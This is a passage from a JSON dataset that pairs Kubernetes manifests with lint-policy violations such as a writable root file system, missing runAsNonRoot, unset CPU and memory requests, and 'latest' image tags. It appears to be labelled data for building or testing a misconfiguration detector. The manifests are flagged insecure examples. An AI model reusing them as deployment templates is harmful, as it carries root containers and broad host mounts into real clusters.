    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kube-controller-manager\nspec:\n  containers:\n  - command:\n    - /bin/sh\n    - -c\n    - /usr/local/bin/kube-controller-manager --master=127.0.0.1:8080 --cluster-name=e2e-test-bburns\n      --cluster-cidr=10.245.0.0/16 --allocate-node-cidrs=true --cloud-provider=gce  --service-account-private-key-file=/srv/kubernetes/server.key\n      --v=2 1>>/var/log/kube-controller-manager.log --leader-elect 2>&1\n    image: k8s.gcr.io/kube-controller-manager:fda24638d51a48baa13c35337fcd4793\n    livenessProbe:\n      httpGet:\n        path: /healthz\n        port: 10252\n      initialDelaySeconds: 15\n      timeoutSeconds: 1\n    name: kube-controller-manager\n    volumeMounts:\n    - mountPath: /srv/kubernetes\n      name: srvkube\n      readOnly: true\n    - mountPath: /var/log/kube-controller-manager.log\n      name: logfile\n    - mountPath: /etc/ssl\n      name: etcssl\n      readOnly: true\n    - mountPath: /usr/share/ssl\n      name: usrsharessl\n      readOnly: true\n    - mountPath: /var/ssl\n      name: varssl\n      readOnly: true\n    - mountPath: /usr/ssl\n      name: usrssl\n      readOnly: true\n    - mountPath: /usr/lib/ssl\n      name: usrlibssl\n      readOnly: true\n    - mountPath: /usr/local/openssl\n      name: usrlocalopenssl\n      readOnly: true\n    - mountPath: /etc/openssl\n      name: etcopenssl\n      readOnly: true\n    - mountPath: /etc/pki/tls\n      name: etcpkitls\n      readOnly: true\n  volumes:\n  - hostPath:\n      path: /srv/kubernetes\n    name: srvkube\n  - hostPath:\n      path: /var/log/kube-controller-manager.log\n      type: FileOrCreate\n    name: logfile\n  - hostPath:\n      path: /etc/ssl\n    name: etcssl\n  - hostPath:\n      path: /usr/share/ssl\n    name: usrsharessl\n  - hostPath:\n      path: /var/ssl\n    name: varssl\n  - hostPath:\n      path: /usr/ssl\n    name: usrssl\n  - hostPath:\n      path: /usr/lib/ssl\n    name: usrlibssl\n  - hostPath:\n      path: /usr/local/openssl\n    name: usrlocalopenssl\n  - hostPath:\n      path: /etc/openssl\n    name: etcopenssl\n  - hostPath:\n      path: /etc/pki/tls\n    name: etcpkitls\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"kube-controller-manager\" has cpu request 0"
  },
  {
    "id": "03871",
    "manifest_path": "data/manifests/the_stack_sample/sample_1718.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kube-controller-manager\nspec:\n  containers:\n  - command:\n    - /bin/sh\n    - -c\n    - /usr/local/bin/kube-controller-manager --master=127.0.0.1:8080 --cluster-name=e2e-test-bburns\n      --cluster-cidr=10.245.0.0/16 --allocate-node-cidrs=true --cloud-provider=gce  --service-account-private-key-file=/srv/kubernetes/server.key\n      --v=2 1>>/var/log/kube-controller-manager.log --leader-elect 2>&1\n    image: k8s.gcr.io/kube-controller-manager:fda24638d51a48baa13c35337fcd4793\n    livenessProbe:\n      httpGet:\n        path: /healthz\n        port: 10252\n      initialDelaySeconds: 15\n      timeoutSeconds: 1\n    name: kube-controller-manager\n    volumeMounts:\n    - mountPath: /srv/kubernetes\n      name: srvkube\n      readOnly: true\n    - mountPath: /var/log/kube-controller-manager.log\n      name: logfile\n    - mountPath: /etc/ssl\n      name: etcssl\n      readOnly: true\n    - mountPath: /usr/share/ssl\n      name: usrsharessl\n      readOnly: true\n    - mountPath: /var/ssl\n      name: varssl\n      readOnly: true\n    - mountPath: /usr/ssl\n      name: usrssl\n      readOnly: true\n    - mountPath: /usr/lib/ssl\n      name: usrlibssl\n      readOnly: true\n    - mountPath: /usr/local/openssl\n      name: usrlocalopenssl\n      readOnly: true\n    - mountPath: /etc/openssl\n      name: etcopenssl\n      readOnly: true\n    - mountPath: /etc/pki/tls\n      name: etcpkitls\n      readOnly: true\n  volumes:\n  - hostPath:\n      path: /srv/kubernetes\n    name: srvkube\n  - hostPath:\n      path: /var/log/kube-controller-manager.log\n      type: FileOrCreate\n    name: logfile\n  - hostPath:\n      path: /etc/ssl\n    name: etcssl\n  - hostPath:\n      path: /usr/share/ssl\n    name: usrsharessl\n  - hostPath:\n      path: /var/ssl\n    name: varssl\n  - hostPath:\n      path: /usr/ssl\n    name: usrssl\n  - hostPath:\n      path: /usr/lib/ssl\n    name: usrlibssl\n  - hostPath:\n      path: /usr/local/openssl\n    name: usrlocalopenssl\n  - hostPath:\n      path: /etc/openssl\n    name: etcopenssl\n  - hostPath:\n      path: /etc/pki/tls\n    name: etcpkitls\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"kube-controller-manager\" has memory limit 0"
  },
  {
    "id": "03872",
    "manifest_path": "data/manifests/the_stack_sample/sample_1720.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nats\n  labels:\n    component: nats\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      component: nats\n  template:\n    metadata:\n      labels:\n        component: nats\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: component\n                operator: In\n                values:\n                - nats\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - name: nats\n        image: nats:1.1.0\n        args:\n        - --config\n        - /etc/nats/config/nats.conf\n        volumeMounts:\n        - name: config-volume\n          mountPath: /etc/nats/config\n        ports:\n        - containerPort: 4222\n          name: client\n        - containerPort: 6222\n          name: cluster\n        - containerPort: 8222\n          name: monitor\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8222\n          initialDelaySeconds: 10\n          timeoutSeconds: 5\n      volumes:\n      - name: config-volume\n        configMap:\n          name: nats-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nats\" does not have a read-only root file system"
  },
  {
    "id": "03873",
    "manifest_path": "data/manifests/the_stack_sample/sample_1720.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nats\n  labels:\n    component: nats\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      component: nats\n  template:\n    metadata:\n      labels:\n        component: nats\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: component\n                operator: In\n                values:\n                - nats\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - name: nats\n        image: nats:1.1.0\n        args:\n        - --config\n        - /etc/nats/config/nats.conf\n        volumeMounts:\n        - name: config-volume\n          mountPath: /etc/nats/config\n        ports:\n        - containerPort: 4222\n          name: client\n        - containerPort: 6222\n          name: cluster\n        - containerPort: 8222\n          name: monitor\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8222\n          initialDelaySeconds: 10\n          timeoutSeconds: 5\n      volumes:\n      - name: config-volume\n        configMap:\n          name: nats-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nats\" is not set to runAsNonRoot"
  },
  {
    "id": "03874",
    "manifest_path": "data/manifests/the_stack_sample/sample_1720.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nats\n  labels:\n    component: nats\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      component: nats\n  template:\n    metadata:\n      labels:\n        component: nats\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: component\n                operator: In\n                values:\n                - nats\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - name: nats\n        image: nats:1.1.0\n        args:\n        - --config\n        - /etc/nats/config/nats.conf\n        volumeMounts:\n        - name: config-volume\n          mountPath: /etc/nats/config\n        ports:\n        - containerPort: 4222\n          name: client\n        - containerPort: 6222\n          name: cluster\n        - containerPort: 8222\n          name: monitor\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8222\n          initialDelaySeconds: 10\n          timeoutSeconds: 5\n      volumes:\n      - name: config-volume\n        configMap:\n          name: nats-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nats\" has cpu request 0"
  },
  {
    "id": "03875",
    "manifest_path": "data/manifests/the_stack_sample/sample_1720.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nats\n  labels:\n    component: nats\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      component: nats\n  template:\n    metadata:\n      labels:\n        component: nats\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: component\n                operator: In\n                values:\n                - nats\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - name: nats\n        image: nats:1.1.0\n        args:\n        - --config\n        - /etc/nats/config/nats.conf\n        volumeMounts:\n        - name: config-volume\n          mountPath: /etc/nats/config\n        ports:\n        - containerPort: 4222\n          name: client\n        - containerPort: 6222\n          name: cluster\n        - containerPort: 8222\n          name: monitor\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8222\n          initialDelaySeconds: 10\n          timeoutSeconds: 5\n      volumes:\n      - name: config-volume\n        configMap:\n          name: nats-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nats\" has memory limit 0"
  },
  {
    "id": "03876",
    "manifest_path": "data/manifests/the_stack_sample/sample_1721.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: jaeger-agent\n  labels:\n    app: jaeger\n    app.kubernetes.io/name: jaeger\n    app.kubernetes.io/component: agent\nspec:\n  selector:\n    matchLabels:\n      app: jaeger\n      app.kubernetes.io/name: jaeger\n      app.kubernetes.io/component: agent\n  template:\n    metadata:\n      labels:\n        app: jaeger\n        app.kubernetes.io/name: jaeger\n        app.kubernetes.io/component: agent\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '14271'\n    spec:\n      containers:\n      - name: jaeger-agent\n        image: jaegertracing/jaeger-agent:1.18.1\n        args:\n        - --config-file=/conf/agent.yaml\n        volumeMounts:\n        - name: jaeger-configuration-volume\n          mountPath: /conf\n        ports:\n        - containerPort: 5775\n          protocol: UDP\n        - containerPort: 6831\n          protocol: UDP\n        - containerPort: 6832\n          protocol: UDP\n        - containerPort: 5778\n          protocol: TCP\n        - containerPort: 14271\n          name: admin-http\n          protocol: TCP\n      volumes:\n      - configMap:\n          name: jaeger-configuration\n          items:\n          - key: agent\n            path: agent.yaml\n        name: jaeger-configuration-volume\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"jaeger-agent\" does not have a read-only root file system"
  },
  {
    "id": "03877",
    "manifest_path": "data/manifests/the_stack_sample/sample_1721.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: jaeger-agent\n  labels:\n    app: jaeger\n    app.kubernetes.io/name: jaeger\n    app.kubernetes.io/component: agent\nspec:\n  selector:\n    matchLabels:\n      app: jaeger\n      app.kubernetes.io/name: jaeger\n      app.kubernetes.io/component: agent\n  template:\n    metadata:\n      labels:\n        app: jaeger\n        app.kubernetes.io/name: jaeger\n        app.kubernetes.io/component: agent\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '14271'\n    spec:\n      containers:\n      - name: jaeger-agent\n        image: jaegertracing/jaeger-agent:1.18.1\n        args:\n        - --config-file=/conf/agent.yaml\n        volumeMounts:\n        - name: jaeger-configuration-volume\n          mountPath: /conf\n        ports:\n        - containerPort: 5775\n          protocol: UDP\n        - containerPort: 6831\n          protocol: UDP\n        - containerPort: 6832\n          protocol: UDP\n        - containerPort: 5778\n          protocol: TCP\n        - containerPort: 14271\n          name: admin-http\n          protocol: TCP\n      volumes:\n      - configMap:\n          name: jaeger-configuration\n          items:\n          - key: agent\n            path: agent.yaml\n        name: jaeger-configuration-volume\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"jaeger-agent\" is not set to runAsNonRoot"
  },
  {
    "id": "03878",
    "manifest_path": "data/manifests/the_stack_sample/sample_1721.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: jaeger-agent\n  labels:\n    app: jaeger\n    app.kubernetes.io/name: jaeger\n    app.kubernetes.io/component: agent\nspec:\n  selector:\n    matchLabels:\n      app: jaeger\n      app.kubernetes.io/name: jaeger\n      app.kubernetes.io/component: agent\n  template:\n    metadata:\n      labels:\n        app: jaeger\n        app.kubernetes.io/name: jaeger\n        app.kubernetes.io/component: agent\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '14271'\n    spec:\n      containers:\n      - name: jaeger-agent\n        image: jaegertracing/jaeger-agent:1.18.1\n        args:\n        - --config-file=/conf/agent.yaml\n        volumeMounts:\n        - name: jaeger-configuration-volume\n          mountPath: /conf\n        ports:\n        - containerPort: 5775\n          protocol: UDP\n        - containerPort: 6831\n          protocol: UDP\n        - containerPort: 6832\n          protocol: UDP\n        - containerPort: 5778\n          protocol: TCP\n        - containerPort: 14271\n          name: admin-http\n          protocol: TCP\n      volumes:\n      - configMap:\n          name: jaeger-configuration\n          items:\n          - key: agent\n            path: agent.yaml\n        name: jaeger-configuration-volume\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"jaeger-agent\" has cpu request 0"
  },
  {
    "id": "03879",
    "manifest_path": "data/manifests/the_stack_sample/sample_1721.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: jaeger-agent\n  labels:\n    app: jaeger\n    app.kubernetes.io/name: jaeger\n    app.kubernetes.io/component: agent\nspec:\n  selector:\n    matchLabels:\n      app: jaeger\n      app.kubernetes.io/name: jaeger\n      app.kubernetes.io/component: agent\n  template:\n    metadata:\n      labels:\n        app: jaeger\n        app.kubernetes.io/name: jaeger\n        app.kubernetes.io/component: agent\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '14271'\n    spec:\n      containers:\n      - name: jaeger-agent\n        image: jaegertracing/jaeger-agent:1.18.1\n        args:\n        - --config-file=/conf/agent.yaml\n        volumeMounts:\n        - name: jaeger-configuration-volume\n          mountPath: /conf\n        ports:\n        - containerPort: 5775\n          protocol: UDP\n        - containerPort: 6831\n          protocol: UDP\n        - containerPort: 6832\n          protocol: UDP\n        - containerPort: 5778\n          protocol: TCP\n        - containerPort: 14271\n          name: admin-http\n          protocol: TCP\n      volumes:\n      - configMap:\n          name: jaeger-configuration\n          items:\n          - key: agent\n            path: agent.yaml\n        name: jaeger-configuration-volume\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"jaeger-agent\" has memory limit 0"
  },
  {
    "id": "03880",
    "manifest_path": "data/manifests/the_stack_sample/sample_1722.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kube-aws-iam-controller\n  namespace: kube-system\n  labels:\n    application: kube-aws-iam-controller\n    version: latest\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      application: kube-aws-iam-controller\n  template:\n    metadata:\n      labels:\n        application: kube-aws-iam-controller\n        version: latest\n    spec:\n      serviceAccountName: kube-aws-iam-controller\n      containers:\n      - name: kube-aws-iam-controller\n        image: registry.opensource.zalan.do/teapot/kube-aws-iam-controller:latest\n        resources:\n          limits:\n            cpu: 25m\n            memory: 100Mi\n          requests:\n            cpu: 25m\n            memory: 100Mi\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"kube-aws-iam-controller\" is using an invalid container image, \"registry.opensource.zalan.do/teapot/kube-aws-iam-controller:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03881",
    "manifest_path": "data/manifests/the_stack_sample/sample_1722.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kube-aws-iam-controller\n  namespace: kube-system\n  labels:\n    application: kube-aws-iam-controller\n    version: latest\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      application: kube-aws-iam-controller\n  template:\n    metadata:\n      labels:\n        application: kube-aws-iam-controller\n        version: latest\n    spec:\n      serviceAccountName: kube-aws-iam-controller\n      containers:\n      - name: kube-aws-iam-controller\n        image: registry.opensource.zalan.do/teapot/kube-aws-iam-controller:latest\n        resources:\n          limits:\n            cpu: 25m\n            memory: 100Mi\n          requests:\n            cpu: 25m\n            memory: 100Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kube-aws-iam-controller\" does not have a read-only root file system"
  },
  {
    "id": "03882",
    "manifest_path": "data/manifests/the_stack_sample/sample_1722.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kube-aws-iam-controller\n  namespace: kube-system\n  labels:\n    application: kube-aws-iam-controller\n    version: latest\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      application: kube-aws-iam-controller\n  template:\n    metadata:\n      labels:\n        application: kube-aws-iam-controller\n        version: latest\n    spec:\n      serviceAccountName: kube-aws-iam-controller\n      containers:\n      - name: kube-aws-iam-controller\n        image: registry.opensource.zalan.do/teapot/kube-aws-iam-controller:latest\n        resources:\n          limits:\n            cpu: 25m\n            memory: 100Mi\n          requests:\n            cpu: 25m\n            memory: 100Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"kube-aws-iam-controller\" is not set to runAsNonRoot"
  },
  {
    "id": "03883",
    "manifest_path": "data/manifests/the_stack_sample/sample_1723.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9766\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "03884",
    "manifest_path": "data/manifests/the_stack_sample/sample_1723.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9766\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "03885",
    "manifest_path": "data/manifests/the_stack_sample/sample_1723.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9766\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "03886",
    "manifest_path": "data/manifests/the_stack_sample/sample_1723.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9766\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "03887",
    "manifest_path": "data/manifests/the_stack_sample/sample_1723.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9766\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "03888",
    "manifest_path": "data/manifests/the_stack_sample/sample_1726.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nsc-memif\n  labels:\n    app: nsc-memif\nspec:\n  selector:\n    matchLabels:\n      app: nsc-memif\n  template:\n    metadata:\n      labels:\n        app: nsc-memif\n    spec:\n      containers:\n      - name: nsc\n        image: networkservicemeshci/cmd-nsc-vpp:da4acb28\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: NSM_REQUEST_TIMEOUT\n          value: 1m\n        - name: SPIFFE_ENDPOINT_SOCKET\n          value: unix:///run/spire/sockets/agent.sock\n        - name: NSM_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        volumeMounts:\n        - name: spire-agent-socket\n          mountPath: /run/spire/sockets\n          readOnly: true\n        - name: nsm-socket\n          mountPath: /var/lib/networkservicemesh\n          readOnly: true\n        resources:\n          limits:\n            memory: 400Mi\n            cpu: 500m\n      volumes:\n      - name: spire-agent-socket\n        hostPath:\n          path: /run/spire/sockets\n          type: Directory\n      - name: nsm-socket\n        hostPath:\n          path: /var/lib/networkservicemesh\n          type: DirectoryOrCreate\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nsc\" does not have a read-only root file system"
  },
  {
    "id": "03889",
    "manifest_path": "data/manifests/the_stack_sample/sample_1726.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nsc-memif\n  labels:\n    app: nsc-memif\nspec:\n  selector:\n    matchLabels:\n      app: nsc-memif\n  template:\n    metadata:\n      labels:\n        app: nsc-memif\n    spec:\n      containers:\n      - name: nsc\n        image: networkservicemeshci/cmd-nsc-vpp:da4acb28\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: NSM_REQUEST_TIMEOUT\n          value: 1m\n        - name: SPIFFE_ENDPOINT_SOCKET\n          value: unix:///run/spire/sockets/agent.sock\n        - name: NSM_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        volumeMounts:\n        - name: spire-agent-socket\n          mountPath: /run/spire/sockets\n          readOnly: true\n        - name: nsm-socket\n          mountPath: /var/lib/networkservicemesh\n          readOnly: true\n        resources:\n          limits:\n            memory: 400Mi\n            cpu: 500m\n      volumes:\n      - name: spire-agent-socket\n        hostPath:\n          path: /run/spire/sockets\n          type: Directory\n      - name: nsm-socket\n        hostPath:\n          path: /var/lib/networkservicemesh\n          type: DirectoryOrCreate\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nsc\" is not set to runAsNonRoot"
  },
  {
    "id": "03890",
    "manifest_path": "data/manifests/the_stack_sample/sample_1726.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nsc-memif\n  labels:\n    app: nsc-memif\nspec:\n  selector:\n    matchLabels:\n      app: nsc-memif\n  template:\n    metadata:\n      labels:\n        app: nsc-memif\n    spec:\n      containers:\n      - name: nsc\n        image: networkservicemeshci/cmd-nsc-vpp:da4acb28\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: NSM_REQUEST_TIMEOUT\n          value: 1m\n        - name: SPIFFE_ENDPOINT_SOCKET\n          value: unix:///run/spire/sockets/agent.sock\n        - name: NSM_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        volumeMounts:\n        - name: spire-agent-socket\n          mountPath: /run/spire/sockets\n          readOnly: true\n        - name: nsm-socket\n          mountPath: /var/lib/networkservicemesh\n          readOnly: true\n        resources:\n          limits:\n            memory: 400Mi\n            cpu: 500m\n      volumes:\n      - name: spire-agent-socket\n        hostPath:\n          path: /run/spire/sockets\n          type: Directory\n      - name: nsm-socket\n        hostPath:\n          path: /var/lib/networkservicemesh\n          type: DirectoryOrCreate\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nsc\" has cpu request 0"
  },
  {
    "id": "03891",
    "manifest_path": "data/manifests/the_stack_sample/sample_1727.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: cadvisor\nspec:\n  replicas: 50\n  selector:\n    app: cadvisor\n  template:\n    metadata:\n      labels:\n        app: cadvisor\n    spec:\n      containers:\n      - name: cadvisor\n        image: google/cadvisor:v0.22.0\n        volumeMounts:\n        - name: rootfs\n          mountPath: /rootfs\n          readOnly: true\n        - name: var-run\n          mountPath: /var/run\n          readOnly: false\n        - name: sys\n          mountPath: /sys\n          readOnly: true\n        - name: docker\n          mountPath: /var/lib/docker\n          readOnly: true\n        ports:\n        - name: http\n          containerPort: 8080\n          protocol: TCP\n        args:\n        - --profiling\n        - --housekeeping_interval=1s\n      volumes:\n      - name: rootfs\n        hostPath:\n          path: /\n      - name: var-run\n        hostPath:\n          path: /var/run\n      - name: sys\n        hostPath:\n          path: /sys\n      - name: docker\n        hostPath:\n          path: /var/lib/docker\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cadvisor\" does not have a read-only root file system"
  },
  {
    "id": "03892",
    "manifest_path": "data/manifests/the_stack_sample/sample_1727.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: cadvisor\nspec:\n  replicas: 50\n  selector:\n    app: cadvisor\n  template:\n    metadata:\n      labels:\n        app: cadvisor\n    spec:\n      containers:\n      - name: cadvisor\n        image: google/cadvisor:v0.22.0\n        volumeMounts:\n        - name: rootfs\n          mountPath: /rootfs\n          readOnly: true\n        - name: var-run\n          mountPath: /var/run\n          readOnly: false\n        - name: sys\n          mountPath: /sys\n          readOnly: true\n        - name: docker\n          mountPath: /var/lib/docker\n          readOnly: true\n        ports:\n        - name: http\n          containerPort: 8080\n          protocol: TCP\n        args:\n        - --profiling\n        - --housekeeping_interval=1s\n      volumes:\n      - name: rootfs\n        hostPath:\n          path: /\n      - name: var-run\n        hostPath:\n          path: /var/run\n      - name: sys\n        hostPath:\n          path: /sys\n      - name: docker\n        hostPath:\n          path: /var/lib/docker\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cadvisor\" is not set to runAsNonRoot"
  },
  {
    "id": "03893",
    "manifest_path": "data/manifests/the_stack_sample/sample_1727.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: cadvisor\nspec:\n  replicas: 50\n  selector:\n    app: cadvisor\n  template:\n    metadata:\n      labels:\n        app: cadvisor\n    spec:\n      containers:\n      - name: cadvisor\n        image: google/cadvisor:v0.22.0\n        volumeMounts:\n        - name: rootfs\n          mountPath: /rootfs\n          readOnly: true\n        - name: var-run\n          mountPath: /var/run\n          readOnly: false\n        - name: sys\n          mountPath: /sys\n          readOnly: true\n        - name: docker\n          mountPath: /var/lib/docker\n          readOnly: true\n        ports:\n        - name: http\n          containerPort: 8080\n          protocol: TCP\n        args:\n        - --profiling\n        - --housekeeping_interval=1s\n      volumes:\n      - name: rootfs\n        hostPath:\n          path: /\n      - name: var-run\n        hostPath:\n          path: /var/run\n      - name: sys\n        hostPath:\n          path: /sys\n      - name: docker\n        hostPath:\n          path: /var/lib/docker\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cadvisor\" has cpu request 0"
  },
  {
    "id": "03894",
    "manifest_path": "data/manifests/the_stack_sample/sample_1727.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: cadvisor\nspec:\n  replicas: 50\n  selector:\n    app: cadvisor\n  template:\n    metadata:\n      labels:\n        app: cadvisor\n    spec:\n      containers:\n      - name: cadvisor\n        image: google/cadvisor:v0.22.0\n        volumeMounts:\n        - name: rootfs\n          mountPath: /rootfs\n          readOnly: true\n        - name: var-run\n          mountPath: /var/run\n          readOnly: false\n        - name: sys\n          mountPath: /sys\n          readOnly: true\n        - name: docker\n          mountPath: /var/lib/docker\n          readOnly: true\n        ports:\n        - name: http\n          containerPort: 8080\n          protocol: TCP\n        args:\n        - --profiling\n        - --housekeeping_interval=1s\n      volumes:\n      - name: rootfs\n        hostPath:\n          path: /\n      - name: var-run\n        hostPath:\n          path: /var/run\n      - name: sys\n        hostPath:\n          path: /sys\n      - name: docker\n        hostPath:\n          path: /var/lib/docker\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cadvisor\" has memory limit 0"
  },
  {
    "id": "03895",
    "manifest_path": "data/manifests/the_stack_sample/sample_1729.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: controller\n    app.kubernetes.io/name: prometheus-operator\n    app.kubernetes.io/part-of: kube-prometheus\n    app.kubernetes.io/version: 0.51.1\n  name: prometheus-operator\n  namespace: monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: controller\n      app.kubernetes.io/name: prometheus-operator\n      app.kubernetes.io/part-of: kube-prometheus\n  template:\n    metadata:\n      annotations:\n        kubectl.kubernetes.io/default-container: prometheus-operator\n      labels:\n        app.kubernetes.io/component: controller\n        app.kubernetes.io/name: prometheus-operator\n        app.kubernetes.io/part-of: kube-prometheus\n        app.kubernetes.io/version: 0.51.1\n    spec:\n      containers:\n      - args:\n        - --kubelet-service=kube-system/kubelet\n        - --prometheus-config-reloader=quay.io/prometheus-operator/prometheus-config-reloader:v0.51.1\n        image: quay.io/prometheus-operator/prometheus-operator:v0.51.1\n        name: prometheus-operator\n        ports:\n        - containerPort: 8080\n          name: http\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        securityContext:\n          allowPrivilegeEscalation: false\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8080/\n        image: quay.io/brancz/kube-rbac-proxy:v0.11.0\n        name: kube-rbac-proxy\n        ports:\n        - containerPort: 8443\n          name: https\n        resources:\n          limits:\n            cpu: 20m\n            memory: 40Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n        securityContext:\n          runAsGroup: 65532\n          runAsNonRoot: true\n          runAsUser: 65532\n      securityContext:\n        